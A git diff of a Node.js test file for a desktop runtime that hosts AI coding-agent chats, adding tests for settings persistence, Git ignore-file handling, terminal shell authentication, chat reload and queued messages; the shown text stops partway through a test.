@@ -14,17 +14,19 @@ async function fixture(t) {
     try {
       for (const runtime of runtimes) await runtime.close();
     } finally {
-      await fs.rm(dir, { recursive: true, force: true });
+      await fs.rm(dir, { recursive: true, force: true, maxRetries: 8, retryDelay: 100 });
     }
   });
   const project = path.join(dir, "project");
   await fs.mkdir(project);
   execFileSync("git", ["init", "-b", "main", project], { stdio: "ignore" });
   const dataDir = path.join(dir, "profile");
+  const chatsHome = path.join(dir, "chats");
   const events = [];
   const options = {
     dataDir,
     cwd: project,
+    chatsHome,
     version: "9.8.7",
     environmentReady: Promise.resolve(),
     emit: (channel, payload) => events.push({ channel, payload }),
@@ -34,33 +36,29 @@ async function fixture(t) {
     runtimes.push(runtime);
     return runtime;
   };
-  return { project, dataDir, events, options, make };
+  return { project, dataDir, chatsHome, events, options, make };
 }
 
-test("the host Designs switch defaults on, broadcasts saves, gates API calls and persists across restarts", async (t) => {
+test("the host Designs switch is always on, so saving it off changes nothing", async (t) => {
   const { make, events } = await fixture(t);
   const runtime = make();
   assert.deepEqual(await runtime.invoke("designs:enabled:read"), { enabled: true });
   const bundled = path.join(__dirname, "bundled-skills", "design", "SKILL.md");
   const allSkills = await runtime.invoke("skills:list", [null]);
   assert.ok([...allSkills.skills, ...allSkills.shadowed].some((skill) => skill.path === bundled));
-  assert.deepEqual(await runtime.invoke("designs:enabled:save", [false]), { enabled: false });
-  assert.deepEqual(events.find((event) => event.channel === "designs:enabled-changed").payload, { enabled: false });
+  assert.deepEqual(await runtime.invoke("designs:enabled:save", [false]), { enabled: true });
+  assert.deepEqual(await runtime.invoke("designs:enabled:read"), { enabled: true });
+  assert.equal(
+    events.find((event) => event.channel === "designs:enabled-changed"),
+    undefined,
+  );
   await assert.rejects(runtime.invoke("artifact:list", [{ chatId: "/unopened#1" }]), /existing Chat/);
-  await assert.rejects(runtime.invoke("artifact:page-shares", [{ chatId: "/unopened#1" }]), /Designs are off/);
-  await assert.rejects(runtime.invoke("artifact:share-page", [{ chatId: "/unopened#1", title: "Designs", acknowledgePublic: true }]), /Designs are off/);
-  await assert.rejects(runtime.invoke("artifact:revoke-page-share", [{ chatId: "/unopened#1", id: "x".repeat(43) }]), /Designs are off/);
   await assert.rejects(runtime.invoke("artifact:add-comments", [{}]), /existing Chat/);
-  const disabledSkills = await runtime.invoke("skills:list", [null]);
-  assert.ok(![...disabledSkills.skills, ...disabledSkills.shadowed].some((skill) => skill.path === bundled));
-  assert.ok([...disabledSkills.skills, ...disabledSkills.shadowed].some((skill) => skill.name === "artifacts"));
-  await assert.rejects(runtime.invoke("skills:read", [null, bundled]), /no longer there/);
-  await assert.rejects(runtime.invoke("designs:enabled:save", ["yes"]), /boolean/);
+  const skills = await runtime.invoke("skills:list", [null]);
+  assert.ok([...skills.skills, ...skills.shadowed].some((skill) => skill.path === bundled));
   await runtime.close();
   const restarted = make();
-  assert.deepEqual(await restarted.invoke("designs:enabled:read"), { enabled: false });
-  assert.deepEqual(await restarted.invoke("designs:enabled:save", [true]), { enabled: true });
-  await assert.rejects(restarted.invoke("artifact:list", [{ chatId: "/unopened#1" }]), /existing Chat/);
+  assert.deepEqual(await restarted.invoke("designs:enabled:read"), { enabled: true });
 });
 
 test("page sharing RPCs validate the existing Chat and preserve the public confirmation boundary", async (t) => {
@@ -81,7 +79,7 @@ test("page sharing RPCs validate the existing Chat and preserve the public confi
   const chatId = `${project}#${session.id}`;
   assert.deepEqual(await runtime.invoke("artifact:page-shares", [{ chatId }]), []);
   await assert.rejects(runtime.invoke("artifact:share-page", [{ chatId, title: "Designs" }]), /Confirm/);
-  await assert.rejects(runtime.invoke("artifact:share-page", [{ chatId, title: "Designs", acknowledgePublic: true }]), /between 1 and 20/);
+  await assert.rejects(runtime.invoke("artifact:share-page", [{ chatId, title: "Designs", acknowledgePublic: true }]), /at least one design/);
   await assert.rejects(runtime.invoke("artifact:page-shares", [{ chatId: `${project}#999999` }]), /existing Chat/);
   await assert.rejects(runtime.invoke("artifact:revoke-page-share", [{ chatId, id: "x".repeat(43) }]), /does not belong/);
   assert.equal(requests.length, 1);
@@ -90,8 +88,29 @@ test("page sharing RPCs validate the existing Chat and preserve the public confi
   await assert.rejects(runtime.invoke("artifact:revoke-saved-page-share", [{ id: "x".repeat(43) }]), /not in this computer/);
 });
 
+test("Done is stamped with the host's clock, reopened, and cleared by a restore, and its retention is a host setting", async (t) => {
+  const { make, project } = await fixture(t);
+  const runtime = make();
+  const opened = await runtime.invoke("project:current");
+  const session = Object.values(opened.state.sessions)[0];
+  const sessionOf = async () => (await runtime.invoke("project:current")).state.sessions[session.id];
+  const before = Date.now();
+  await runtime.invoke("chat:patch", [project, session.id, { done: true, unread: false, done_at: 1 }]);
+  const done = await sessionOf();
+  assert.ok(done.done_at >= before && done.done_at <= Date.now(), "the client's own clock is ignored");
+  await runtime.invoke("chat:patch", [project, session.id, { done: false }]);
+  assert.equal((await sessionOf()).done_at, undefined);
+  await runtime.invoke("chat:patch", [project, session.id, { done: true }]);
+  await runtime.invoke("chat:patch", [project, session.id, { archived: true }]);
+  await runtime.invoke("chat:patch", [project, session.id, { archived: false }]);
+  assert.equal((await sessionOf()).done_at, undefined, "a Chat back from the archive is back in the list");
+  assert.deepEqual(await runtime.invoke("done:settings:read"), { retentionHours: 24 });
+  assert.deepEqual(await runtime.invoke("done:settings:save", [{ retentionHours: 8 }]), { retentionHours: 8 });
+  assert.deepEqual(await runtime.invoke("done:settings:read"), { retentionHours: 8 });
+});
+
 test("Node runtime preserves stored Chats and provider IDs across a restart", async (t) => {
-  const { project, options, events, make } = await fixture(t);
+  const { project, events, make } = await fixture(t);
   const first = make();
   const opened = await first.invoke("project:current");
   const session = Object.values(opened.state.sessions)[0];
@@ -117,6 +136,23 @@ test("Node runtime preserves stored Chats and provider IDs across a restart", as
   await assert.rejects(second.invoke("not:a-command"), /Unknown command/);
 });
 
+test("terminal shell preferences require authentication and persist across runtime restarts", async (t) => {
+  const { make, events } = await fixture(t);
+  const runtime = make();
+  const context = { clientId: "desktop" };
+  await assert.rejects(runtime.invoke("terminal:profiles"), /authenticated connection/);
+  await assert.rejects(runtime.invoke("terminal:setShell", [{ shell: null }]), /authenticated connection/);
+  const profiles = await runtime.invoke("terminal:profiles", [], context);
+  assert.ok(profiles.shells.length > 0);
+  const chosen = profiles.shells[0].file;
+  assert.equal((await runtime.invoke("terminal:setShell", [{ shell: chosen }], context)).selectedShell, chosen);
+  assert.ok(events.some((event) => event.channel === "terminal:preferences-changed"));
+  await runtime.close();
+  const restarted = make();
+  assert.equal((await restarted.invoke("terminal:profiles", [], { clientId: "phone" })).selectedShell, chosen);
+  assert.equal((await restarted.invoke("terminal:setShell", [{ shell: null }], context)).selectedShell, null);
+});
+
 test("the old handover commands are gone", async (t) => {
   const { make } = await fixture(t);
   const runtime = make();
@@ -126,7 +162,7 @@ test("the old handover commands are gone", async (t) => {
 });
 
 test("exclusive ownership rejects another profile owner and aliases of an open Project", async (t) => {
-  const { project, dataDir, options, make } = await fixture(t);
+  const { project, dataDir, make } = await fixture(t);
   const first = make();
   assert.throws(() => make(), /already owned/);
   await first.openProject(project);
@@ -142,8 +178,140 @@ test("exclusive ownership rejects another profile owner and aliases of an open P
   assert.equal((await other.openProject(alias)).path, project);
 });
 
+test("opening and reopening a Git Project ignores runtime state while shared configuration stays stageable", async (t) => {
+  const { project, make } = await fixture(t);
+  const git = (...args) => execFileSync("git", ["-C", project, ...args], { encoding: "utf8" });
+  const runtime = make();
+  await Promise.all([runtime.openProject(project), runtime.openProject(project)]);
+  assert.equal(git("status", "--porcelain"), "");
+  const metadata = path.join(project, ".milagre");
+  // Include SQLite side files, migration backups and interrupted writes as well as completed saves.
+  for (const file of ["chats.db-wal", "chats.db-shm", "chats.db-journal", "coordination.json.before-chats-db", "coordination.json.123.1.tmp"])
+    await fs.writeFile(path.join(metadata, file), "");
+  for (const folder of ["runtime.lock.takeover", "details", "images", "subagents", "runtime", "worktrees"]) {
+    await fs.mkdir(path.join(metadata, folder), { recursive: true });
+    await fs.writeFile(path.join(metadata, folder, "local.json"), "{}");
+  }
+  git("add", ".");
+  assert.equal(git("diff", "--cached", "--name-only"), "");
+  const ignore = await fs.readFile(path.join(metadata, ".gitignore"), "utf8");
+  await runtime.close();
+  const reopened = make();
+  await reopened.openProject(project);
+  assert.equal(git("status", "--porcelain"), "");
+  assert.equal(await fs.readFile(path.join(metadata, ".gitignore"), "utf8"), ignore);
+  for (const file of ["worktree.json", "checkpoint-ignore", "team-notes.txt"]) await fs.writeFile(path.join(metadata, file), "shared\n");
+  git("add", ".");
+  assert.deepEqual(git("diff", "--cached", "--name-only").trim().split("\n"), [
+    ".milagre/checkpoint-ignore",
+    ".milagre/team-notes.txt",
+    ".milagre/worktree.json",
+  ]);
+});
+
+test("a text-only Git Project opens, closes and reopens without hard-link support", async (t) => {
+  const { project, make } = await fixture(t);
+  const syncFs = require("node:fs");
+  const link = syncFs.linkSync;
+  const metadata = path.join(project, ".milagre");
+  t.mock.method(syncFs, "linkSync", (from, to) => {
+    if (to === path.join(metadata, ".gitignore")) throw Object.assign(new Error("hard links unsupported"), { code: "ENOTSUP" });
+    return link(from, to);
+  });
+  const warn = t.mock.method(console, "warn", () => {});
+  const runtime = make();
+  await Promise.all([runtime.openProject(project), runtime.openProject(project)]);
+  const opened = await runtime.invoke("project:current");
+  const session = Object.values(opened.state.sessions)[0];
+  await runtime.invoke("chat:patch", [project, session.id, { title: "Text-only Chat" }]);
+  await runtime.close();
+  for (const lock of [".milagre/runtime.lock", ".git/milagre-runtime.lock"]) await assert.rejects(fs.stat(path.join(project, lock)), { code: "ENOENT" });
+  const reopened = make();
+  assert.equal((await reopened.openProject(project)).path, project);
+  const restored = await reopened.invoke("project:current");
+  assert.equal(restored.state.sessions[session.id].title, "Text-only Chat");
+  await reopened.close();
+  for (const lock of [".milagre/runtime.lock", ".git/milagre-runtime.lock"]) await assert.rejects(fs.stat(path.join(project, lock)), { code: "ENOENT" });
+  assert.ok((await fs.readdir(metadata)).every((file) => !file.startsWith(".gitignore")));
+  assert.equal(warn.mock.callCount(), 2);
+});
+
+test("opening preserves an existing metadata ignore file, including when tracked", async (t) => {
+  const { project, make } = await fixture(t);
+  const metadata = path.join(project, ".milagre");
+  await fs.mkdir(metadata);
+  const original = "# Team rules\r\n*.local\r\n!worktree.json";
+  const file = path.join(metadata, ".gitignore");
+  await fs.writeFile(file, original);
+  const runtime = make();
+  await runtime.openProject(project);
+  assert.equal(await fs.readFile(file, "utf8"), original);
+  await runtime.close();
+  execFileSync("git", ["-C", project, "add", ".milagre/.gitignore"]);
+  const reopened = make();
+  await reopened.openProject(project);
+  assert.equal(await fs.readFile(file, "utf8"), original);
+  assert.equal(execFileSync("git", ["-C", project, "diff", "--", ".milagre/.gitignore"], { encoding: "utf8" }), "");
+});
+
+test("a partial ignore write releases both ownership locks and permits a protected retry", async (t) => {
+  const { project, make } = await fixture(t);
+  const syncFs = require("node:fs");
+  const write = syncFs.writeFileSync;
+  const mocked = t.mock.method(syncFs, "writeFileSync", (file, ...args) => {
+    if (path.dirname(file) === path.join(project, ".milagre") && path.basename(file).startsWith(".gitignore.")) {
+      write(file, "# partial", { flag: "wx" });
+      throw Object.assign(new Error("ignore write denied"), { code: "ENOSPC" });
+    }
+    return write(file, ...args);
+  });
+  const runtime = make();
+  await assert.rejects(runtime.openProject(project), /ignore write denied/);
+  for (const lock of [".milagre/runtime.lock", ".git/milagre-runtime.lock"]) await assert.rejects(fs.stat(path.join(project, lock)), { code: "ENOENT" });
+  assert.deepEqual(await fs.readdir(path.join(project, ".milagre")), []);
+  mocked.mock.restore();
+  await runtime.openProject(project);
+  assert.ok(await fs.stat(path.join(project, ".milagre", ".gitignore")));
+  assert.equal(execFileSync("git", ["-C", project, "status", "--porcelain"], { encoding: "utf8" }), "");
+});
+
+test("ignore initialization still releases repository ownership if project-lock cleanup fails", async (t) => {
+  const { project, make } = await fixture(t);
+  const syncFs = require("node:fs");
+  const link = syncFs.linkSync;
+  const unlink = syncFs.unlinkSync;
+  const mockedLink = t.mock.method(syncFs, "linkSync", (from, to) => {
+    if (to === path.join(project, ".milagre", ".gitignore")) throw new Error("ignore publish denied");
+    return link(from, to);
+  });
+  const mockedUnlink = t.mock.method(syncFs, "unlinkSync", (file) => {
+    if (file === path.join(project, ".milagre", "runtime.lock", "owner.json")) throw new Error("project-lock cleanup denied");
+    return unlink(file);
+  });
+  await assert.rejects(make().openProject(project), /project-lock cleanup denied/);
+  await assert.rejects(fs.stat(path.join(project, ".git", "milagre-runtime.lock")), { code: "ENOENT" });
+  mockedLink.mock.restore();
+  mockedUnlink.mock.restore();
+});
+
+test("opening a metadata symlink never creates an ignore file at its external destination", async (t) => {
+  const { project, make } = await fixture(t);
+  const external = path.join(path.dirname(project), "external-metadata");
+  await fs.mkdir(external);
+  await fs.symlink(external, path.join(project, ".milagre"), process.platform === "win32" ? "junction" : "dir");
+  await make().openProject(project);
+  await assert.rejects(fs.stat(path.join(external, ".gitignore")), { code: "ENOENT" });
+});
+
+test("opening a non-Git Project does not create Git ignore configuration", async (t) => {
+  const { project, make } = await fixture(t);
+  await fs.rm(path.join(project, ".git"), { recursive: true });
+  await make().openProject(project);
+  await assert.rejects(fs.stat(path.join(project, ".milagre", ".gitignore")), { code: "ENOENT" });
+});
+
 test("close waits for a command already changing saved settings before releasing ownership", async (t) => {
-  const { project, options, make } = await fixture(t);
+  const { project, make } = await fixture(t);
   const runtime = make();
   await runtime.invoke("project:current");
   const { promise: writing, resolve: started } = Promise.withResolvers();
@@ -293,7 +461,7 @@ test("Chat edits still report a disk failure while streaming writes are deferred
   const rename = fs.rename;
   let fail = true;
   t.mock.method(fs, "rename", async (...args) => {
-    if (fail && String(args[1]).endsWith("/coordination.json")) throw new Error("disk full");
+    if (fail && path.basename(String(args[1])) === "coordination.json") throw new Error("disk full");
     return rename(...args);
   });
   for (const [method, args] of [
@@ -308,23 +476,49 @@ test("Chat edits still report a disk failure while streaming writes are deferred
   assert.equal((await readSavedState(project)).sessions[session.id].title, "Keep my title");
 });
 
-test("a failed Worktree discovery preserves existing Chats and disk state", async (t) => {
+test("a Project that loses its .git keeps its Worktree Chats and disk state", async (t) => {
   const { project, make } = await fixture(t);
+  execFileSync("git", ["-C", project, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "--allow-empty", "-m", "start"], { stdio: "ignore" });
+  execFileSync("git", ["-C", project, "worktree", "add", "-b", "side", path.join(path.dirname(project), "side")], { stdio: "ignore" });
   const runtime = make();
   const opened = await runtime.openProject(project);
+  assert.equal(opened.git, true);
   const session = Object.values(opened.state.sessions)[0];
   await runtime.invoke("chat:patch", [project, session.id, { title: "Never erase this" }]);
   const file = path.join(project, ".milagre/coordination.json");
   const before = await fs.readFile(file, "utf8");
   await fs.rename(path.join(project, ".git"), path.join(project, ".git-unavailable"));
   try {
-    await assert.rejects(runtime.openProject(project));
+    await assert.rejects(runtime.openProject(project), /no longer a Git repository/);
   } finally {
     await fs.rename(path.join(project, ".git-unavailable"), path.join(project, ".git"));
   }
+  assert.equal(Object.keys((await runtime.invoke("project:snapshot", [project])).state.worktrees).length, 2);
   assert.equal((await runtime.invoke("project:snapshot", [project])).state.sessions[session.id].title, "Never erase this");
   await runtime.close();
   assert.equal(JSON.parse(await fs.readFile(file, "utf8")).sessions[session.id].title, JSON.parse(before).sessions[session.id].title);
+});
+
+test("a folder outside Git opens as a Project whose one Worktree is the folder itself", async (t) => {
+  const { project, make } = await fixture(t);
+  const plain = path.join(path.dirname(project), "notes");
+  await fs.mkdir(plain);
+  await fs.writeFile(path.join(plain, "todo.md"), "- milk\n");
+  const runtime = make();
+  const opened = await runtime.openProject(plain);
+  assert.equal(opened.git, false);
+  assert.equal(opened.path, plain);
+  assert.deepEqual(
+    Object.values(opened.state.worktrees).map((worktree) => [worktree.path, worktree.name]),
+    [[plain, "notes"]],
+  );
+  assert.equal(Object.keys(opened.state.sessions).length, 1);
+  assert.deepEqual(await runtime.invoke("project:files", [plain, "todo"]), ["todo.md"]);
+  await assert.rejects(runtime.invoke("worktree:create", [{ projectPath: plain, baseBranch: "main", prompt: "" }]), /has no Git/);
+  assert.deepEqual(await runtime.invoke("project:plain-root", [plain]), [plain]);
+  await assert.rejects(runtime.invoke("project:plain-root", [path.dirname(plain)]), /isn't a project/);
+  // Reopening keeps the same Project: the recent list and registry hold it by its path.
+  assert.equal((await runtime.invoke("project:switch", [plain])).path, plain);
 });
 
 test("quit stops agents after a disk failure and can retry before releasing ownership", async (t) => {
@@ -359,7 +553,7 @@ test("quit stops agents after a disk failure and can retry before releasing owne
   const rename = fs.rename;
   let fail = true;
   t.mock.method(fs, "rename", async (...args) => {
-    if (fail && String(args[1]).endsWith("/coordination.json")) throw new Error("disk full");
+    if (fail && path.basename(String(args[1])) === "coordination.json") throw new Error("disk full");
     return rename(...args);
   });
   await assert.rejects(runtime.close(), /disk full/);
@@ -432,6 +626,355 @@ test("agent:interrupt during a preparing handoff cancels it, fails the divider a
     false,
   );
   assert.ok(state.messages.some((item) => item.outcome === "cancelled"));
+});
+
+// A fake agent per chat:send. `finish` false leaves its turn running, as a long reply does.
+function reloadAgents() {
+  const sessions = [];
+  let finish = true;
+  return {
+    sessions,
+    running: () => void (finish = false),
+    createSession(provider, options) {
+      const session = {
+        provider,
+        options,
+        turnActive: false,
+        closed: false,
+        startTurn: async () => {
+          session.turnActive = true;
+          options.emit({ type: "turn-started", turnId: "t" });
+          options.emit({ type: "session-started", nativeId: "claude-1" });
+          options.emit({ type: "text-delta", messageId: `m${sessions.length}`, text: "Working." });
+          if (finish) {
+            session.turnActive = false;
+            options.emit({ type: "turn-completed" });
+          }
+          return { turnId: "t" };
+        },
+        interrupt: async () => {
+          if (!session.turnActive) return;
+          session.turnActive = false;
+          options.emit({ type: "turn-cancelled" });
+        },
+        close: async () => {
+          session.closed = true;
+        },
+      };
+      sessions.push(session);
+      return session;
+    },
+  };
+}
+
+test("archiving a Chat stops its running turn, so the question it waits on stops asking", async (t) => {
+  const { project, make } = await fixture(t);
+  const agents = reloadAgents();
+  agents.running();
+  const runtime = make({ titleModels: {}, agentCli: async () => ({ command: "/fake" }), createSession: agents.createSession });
+  const opened = await runtime.openProject(project);
+  const chat = Object.values(opened.state.sessions)[0];
+  const chatId = `${project}#${chat.id}`;
+  const runOf = async () => (await runtime.invoke("chat:runs")).runs[chatId];
+  await runtime.invoke("chat:send", [{ projectPath: project, sessionId: chat.id, body: "Ask me", provider: "claude", model: "claude-opus-5-5" }]);
+  for (let i = 0; i < 200 && !agents.sessions.length; i++) await new Promise((resolve) => setTimeout(resolve, 10));
+  const session = agents.sessions[0];
+  session.options.emit({ type: "question-request", requestId: "q1", questions: [{ id: "0", question: "Which one?", options: [] }] });
+  for (let i = 0; i < 200 && !(await runOf())?.questions?.length; i++) await new Promise((resolve) => setTimeout(resolve, 10));
+  assert.equal((await runOf()).questions.length, 1);
+
+  // A client whose copy of the runs missed the turn archives without stopping it first.
+  await runtime.invoke("chat:patch", [project, chat.id, { archived: true, unread: false }]);
+  for (let i = 0; i < 200 && (await runOf()); i++) await new Promise((resolve) => setTimeout(resolve, 10));
+  assert.equal(session.turnActive, false);
+  assert.equal(await runOf(), undefined);
+  await runtime.close();
+});
+
+test("chat:reload ends the agent's process, and the next message resumes its session in a new one", async (t) => {
+  const { project, make } = await fixture(t);
+  const agents = reloadAgents();
+  const runtime = make({ titleModels: {}, agentCli: async () => ({ command: "/fake" }), createSession: agents.createSession });
+  const opened = await runtime.openProject(project);
+  const chat = Object.values(opened.state.sessions)[0];
+  const chatId = `${project}#${chat.id}`;
+  const stateOf = async () => (await runtime.invoke("project:snapshot", [project])).state;
+  const send = (body) => runtime.invoke("chat:send", [{ projectPath: project, sessionId: chat.id, body, provider: "claude", model: "claude-opus-5-5" }]);
+  const completed = async (count) => {
+    for (let i = 0; i < 200 && (await stateOf()).messages.filter((item) => item.outcome === "completed").length < count; i++)
+      await new Promise((r) => setTimeout(r, 10));
+  };
+  await send("first");
+  await completed(1);
+
+  agents.sessions[0].options.emit({ type: "prompt-suggestion", text: "Continue", turnId: "t" });
+  for (let i = 0; i < 200 && !(await stateOf()).sessions[chat.id].suggestion; i++) await new Promise((resolve) => setTimeout(resolve, 10));
+  assert.equal((await stateOf()).sessions[chat.id].suggestion.text, "Continue");
+
+  await runtime.invoke("chat:reload", [chatId]);
+  assert.equal(agents.sessions[0].closed, true);
+  assert.equal((await stateOf()).sessions[chat.id].suggestion, undefined);
+  assert.equal((await stateOf()).sessions[chat.id].suggestionTurnId, undefined);
+  assert.equal((await stateOf()).sessions[chat.id].native_session_id, "claude-1");
+  const { role, body, context } = (await stateOf()).messages.at(-1);
+  assert.deepEqual({ role, body, context }, { role: "assistant", body: "Chat reloaded", context: { kind: "reload" } });
+
+  await send("second");
+  await completed(2);
+  assert.equal(agents.sessions.length, 2);
+  assert.equal(agents.sessions[1].options.resumeId, "claude-1");
+  assert.deepEqual(
+    (await stateOf()).messages.map((item) => item.context?.kind ?? item.role),
+    ["user", "assistant", "reload", "user", "assistant"],
+  );
+});
+
+test("chat:reload stops a running turn and puts its line after the reply so far", async (t) => {
+  const { project, make } = await fixture(t);
+  const agents = reloadAgents();
+  const runtime = make({ titleModels: {}, agentCli: async () => ({ command: "/fake" }), createSession: agents.createSession });
+  const opened = await runtime.openProject(project);
+  const chat = Object.values(opened.state.sessions)[0];
+  const stateOf = async () => (await runtime.invoke("project:snapshot", [project])).state;
+  agents.running();
+  await runtime.invoke("chat:send", [{ projectPath: project, sessionId: chat.id, body: "long job", provider: "claude", model: "claude-opus-5-5" }]);
+  for (let i = 0; i < 200 && !agents.sessions[0]?.turnActive; i++) await new Promise((r) => setTimeout(r, 10));
+
+  await runtime.invoke("chat:reload", [`${project}#${chat.id}`]);
+  for (let i = 0; i < 200 && !(await stateOf()).messages.some((item) => item.context?.kind === "reload"); i++) await new Promise((r) => setTimeout(r, 10));
+  const { messages } = await stateOf();
+  assert.equal(agents.sessions[0].closed, true);
+  assert.deepEqual(
+    messages.map((item) => [item.context?.kind ?? item.role, item.outcome]),
+    [
+      ["user", undefined],
+      ["assistant", "cancelled"],
+      ["reload", undefined],
+    ],
+  );
+});
+
+test("answers reach the agent before their message is saved, and its next reply still lands below them", async (t) => {
+  const { project, events, make } = await fixture(t);
+  const agents = reloadAgents();
+  const runtime = make({ titleModels: {}, agentCli: async () => ({ command: "/fake" }), createSession: agents.createSession });
+  const opened = await runtime.openProject(project);
+  const chat = Object.values(opened.state.sessions)[0];
+  const chatId = `${project}#${chat.id}`;
+  const stateOf = async () => (await runtime.invoke("project:snapshot", [project])).state;
+  agents.running();
+  await runtime.invoke("chat:send", [{ projectPath: project, sessionId: chat.id, body: "pick a layout", provider: "claude", model: "claude-opus-5-5" }]);
+  for (let i = 0; i < 200 && !agents.sessions[0]?.turnActive; i++) await new Promise((r) => setTimeout(r, 10));
+  const session = agents.sessions[0];
+  const question = { id: "layout", header: "Layout", question: "Which layout?", options: [{ label: "Grid", description: "" }], multiSelect: false };
+  session.options.emit({ type: "question-request", requestId: "q1", questions: [question] });
+  const sent = () => events.some(({ channel, payload }) => channel === "agent:event" && payload.chatId === chatId && payload.event.type === "answers-sent");
+  for (let i = 0; i < 200 && !(await runtime.invoke("chat:runs")).runs[chatId]?.questions.length; i++) await new Promise((r) => setTimeout(r, 10));
+  let savedFirst = null;
+  session.answerQuestion = (requestId, answers) => {
+    savedFirst = sent();
+    session.options.emit({ type: "question-resolved", requestId, outcome: "answered" });
+    session.options.emit({ type: "text-delta", messageId: "m2", text: "Grid it is." });
+    return requestId === "q1" && answers.layout[0] === "Grid";
+  };
+
+  assert.equal(await runtime.invoke("agent:answer-question", [{ chatId, requestId: "q1", answers: { layout: ["Grid"] }, summary: "Grid" }]), true);
+  assert.equal(savedFirst, false);
+  session.turnActive = false;
+  session.options.emit({ type: "turn-completed" });
+  for (let i = 0; i < 200 && !(await stateOf()).messages.some((item) => item.body === "Grid it is."); i++) await new Promise((r) => setTimeout(r, 10));
+  assert.deepEqual(
+    (await stateOf()).messages.map((item) => [item.role, item.body]),
+    [
+      ["user", "pick a layout"],
+      ["assistant", "Working."],
+      ["user", "Grid"],
+      ["assistant", "Grid it is."],
+    ],
+  );
+});
+
+test("images attached to an answer are stored: the agent gets their paths and the answers message shows them", async (t) => {
+  const { project, make } = await fixture(t);
+  const agents = reloadAgents();
+  const runtime = make({ titleModels: {}, agentCli: async () => ({ command: "/fake" }), createSession: agents.createSession });
+  const opened = await runtime.openProject(project);
+  const chat = Object.values(opened.state.sessions)[0];
+  const chatId = `${project}#${chat.id}`;
+  const stateOf = async () => (await runtime.invoke("project:snapshot", [project])).state;
+  agents.running();
+  await runtime.invoke("chat:send", [{ projectPath: project, sessionId: chat.id, body: "what's wrong?", provider: "claude", model: "claude-opus-5-5" }]);
+  for (let i = 0; i < 200 && !agents.sessions[0]?.turnActive; i++) await new Promise((r) => setTimeout(r, 10));
+  const session = agents.sessions[0];
+  const question = {
+    id: "0",
+    header: "Bug",
+    question: "What do you see?",
+    options: [{ label: "Nothing" }],
+    multiSelect: false,
+    allowOther: true,
+    secret: false,
+  };
+  session.options.emit({ type: "question-request", requestId: "q1", questions: [question] });
+  for (let i = 0; i < 200 && !(await runtime.invoke("chat:runs")).runs[chatId]?.questions.length; i++) await new Promise((r) => setTimeout(r, 10));
+  let received = null;
+  session.answerQuestion = (requestId, answers) => {
+    received = answers;
+    session.options.emit({ type: "question-resolved", requestId, outcome: "answered" });
+    return true;
+  };
+  const image = {
+    id: "i1",
+    name: "screen.png",
+    dataUrl: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
+  };
+
+  assert.equal(
+    await runtime.invoke("agent:answer-question", [{ chatId, requestId: "q1", answers: { 0: [] }, summary: "Bug: 1 image", images: { 0: [image] } }]),
+    true,
+  );
+  assert.equal(received["0"].length, 1);
+  const [, file] = /^Image the user attached: (\S+) \(open the file to see it\)$/.exec(received["0"][0]) ?? [];
+  assert.ok(file, received["0"][0]);
+  assert.equal((await fs.readFile(file)).toString("base64"), image.dataUrl.split(",")[1]);
+  const message = (await stateOf()).messages.find((item) => item.answered);
+  assert.deepEqual(message.answered, [{ header: "Bug", question: "What do you see?", answers: ["1 image"] }]);
+  assert.deepEqual(
+    message.images.map((item) => [item.name, item.path]),
+    [["screen.png", file]],
+  );
+  await assert.rejects(
+    runtime.invoke("agent:answer-question", [{ chatId, requestId: "q1", answers: { 0: ["x"] }, images: { 0: "not a list" } }]),
+    /Invalid images/,
+  );
+});
+
+test("chat:reload waits for the Chat's background subagents instead of stopping them (T3 #16000)", async (t) => {
+  const { project, make } = await fixture(t);
+  const agents = reloadAgents();
+  const runtime = make({ titleModels: {}, agentCli: async () => ({ command: "/fake" }), createSession: agents.createSession });
+  const opened = await runtime.openProject(project);
+  const chat = Object.values(opened.state.sessions)[0];
+  const chatId = `${project}#${chat.id}`;
+  const stateOf = async () => (await runtime.invoke("project:snapshot", [project])).state;
+  const background = (status) => ({
+    type: "subagent-update",
+    agent: { id: "bg", title: "Review", status, background: true, startedAt: 1, updatedAt: Date.now(), transcript: [] },
+  });
+  await runtime.invoke("chat:send", [{ projectPath: project, sessionId: chat.id, body: "review it", provider: "claude", model: "claude-opus-5-5" }]);
+  for (let i = 0; i < 200 && !agents.sessions[0]; i++) await new Promise((r) => setTimeout(r, 10));
+  agents.sessions[0].options.emit(background("running"));
+  for (let i = 0; i < 200 && !(await stateOf()).sessions[chat.id].subagents?.length; i++) await new Promise((r) => setTimeout(r, 10));
+
+  await assert.rejects(
+    runtime.invoke("chat:reload", [chatId]),
+    /A background task is still running in this Chat\. Reloading would stop it\. Ask the agent to stop it, or reload once it finishes\./,
+  );
+  assert.equal(agents.sessions[0].closed, false);
+  assert.equal(
+    (await stateOf()).messages.some((item) => item.context?.kind === "reload"),
+    false,
+  );
+
+  agents.sessions[0].options.emit(background("completed"));
+  for (let i = 0; i < 200 && (await stateOf()).sessions[chat.id].subagents[0].status !== "completed"; i++) await new Promise((r) => setTimeout(r, 10));
+  await runtime.invoke("chat:reload", [chatId]);
+  assert.equal(agents.sessions[0].closed, true);
+});
+
+test("chat:queue-send stops the running Antigravity turn and starts the queued message; chat:queue-remove drops one", async (t) => {
+  const { project, make } = await fixture(t);
+  const agents = reloadAgents();
+  const prompts = [];
+  const createSession = (provider, options) => {
+    const session = agents.createSession(provider, options);
+    const start = session.startTurn;
+    session.startTurn = (turn) => {
+      prompts.push(turn.prompt);
+      return start(turn);
+    };
+    return session;
+  };
+  const runtime = make({ titleModels: {}, agentCli: async () => ({ command: "/fake" }), createSession });
+  const opened = await runtime.openProject(project);
+  const chat = Object.values(opened.state.sessions)[0];
+  const chatId = `${project}#${chat.id}`;
+  const sessionOf = async () => (await runtime.invoke("project:snapshot", [project])).state.sessions[chat.id];
+  const send = (body) =>
+    runtime.invoke("chat:send", [{ projectPath: project, sessionId: chat.id, body, provider: "antigravity", model: "gemini-3.8-flash-high" }]);
+  const until = async (check) => {
+    for (let i = 0; i < 300 && !(await check()); i++) await new Promise((r) => setTimeout(r, 10));
+    assert.ok(await check());
+  };
+  agents.running();
+  await send("long job");
+  await until(() => agents.sessions[0]?.turnActive);
+  await send("then this");
+  await send("and this");
+  await until(async () => (await sessionOf()).queued?.length === 2);
+  assert.deepEqual(prompts, ["long job"]);
+  const [first, second] = (await sessionOf()).queued;
+
